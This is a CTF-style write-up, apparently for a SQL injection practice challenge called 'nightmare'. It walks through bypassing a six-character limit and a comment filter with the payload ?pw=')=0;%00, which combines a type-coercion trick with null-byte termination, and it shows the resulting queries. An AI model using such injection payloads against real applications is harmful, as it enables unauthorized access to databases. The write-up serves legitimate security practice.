---
custom_edit_url: null
sidebar_position: 18
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/b37663bf-7e53-4d53-b15b-b9e65b46df36)

We are provided with the SQL query:

```sql
SELECT id FROM prob_nightmare WHERE pw=('{$_GET[pw]}') AND id!='admin'
```

### Filter
The code filters out the following:

- `pw` parameter value greater than 6 characters
- `#`
- `-`

In order to make the given SQL query result in `TRUE`, we have to set the password to an empty string.

In order to do so within 6 characters, we can provide the following URI parameter:

```
?pw=')=0
```

The resultant query becomes:

```sql
SELECT id FROM prob_nightmare WHERE pw=('')=0') AND id!='admin'
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/c75599ca-621e-48f4-8fd0-af5f0c3f162a)

Now, in order to remove the rest of query we have use a NULL byte (`%00`). This terminates the query.
We also have to add a semi-colon (`;`) before terminating the query.

If we provide the following URI parameter:

```
?pw=')=0;%00
```

The resultant query becomes:

```sql
SELECT id FROM prob_nightmare WHERE pw=('')=0;

## Terminated part:
') AND id!='admin'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/0cdb82c7-6781-4cb7-8ebd-fd513f70f309)
